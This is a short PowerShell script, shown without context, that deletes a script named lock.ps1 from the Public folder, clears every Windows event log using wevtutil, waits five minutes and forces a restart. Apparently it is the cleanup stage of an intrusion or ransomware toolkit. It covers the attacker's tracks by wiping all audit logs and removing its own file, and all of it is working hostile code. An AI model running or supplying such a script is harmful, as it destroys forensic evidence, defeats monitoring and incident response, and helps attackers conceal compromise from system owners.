$filePath = "C:\Users\Public\lock.ps1"

if (Test-Path $filePath) {
    Remove-Item $filePath -Force
}

wevtutil el | foreach { wevtutil cl $_ }
Start-Sleep -Seconds 300
Restart-Computer -Force
